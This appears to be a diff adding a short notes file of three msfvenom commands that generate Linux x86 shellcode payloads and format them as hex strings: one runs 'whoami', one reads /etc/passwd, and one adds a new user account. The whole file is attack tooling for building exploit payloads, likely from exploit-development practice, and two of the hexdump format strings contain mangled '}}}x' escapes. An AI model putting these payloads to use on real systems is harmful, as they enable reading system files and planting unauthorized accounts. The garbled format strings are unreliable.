@@ -1,0 +1,5 @@
+#1 msfvenom -p linux/x86/exec cmd=whoami R | hexdump -v -e '"}}}x" 1/1 "%02x"'
+
+#2 msfvenom -p linux/x86/read_file path=/etc/passwd R | hexdump -v -e '"\\\x" 1/1 "%02x"'
+
+#3 msfvenom -p linux/x86/adduser R | hexdump -v -e '"}}}x" 1/1 "%02x"'
